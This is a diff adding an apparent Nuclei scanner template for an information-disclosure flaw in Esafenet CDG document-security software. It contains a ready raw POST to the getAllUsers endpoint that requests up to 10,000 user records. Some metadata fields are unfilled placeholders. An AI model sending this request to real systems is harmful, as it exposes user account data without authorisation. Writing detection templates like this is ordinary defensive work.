@@ -1,0 +1,26 @@
+id: CDGServer3-getAllUsers-info
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept:
+        text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 27
+
+        pageSize=10000&pageNumber=1
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code"'
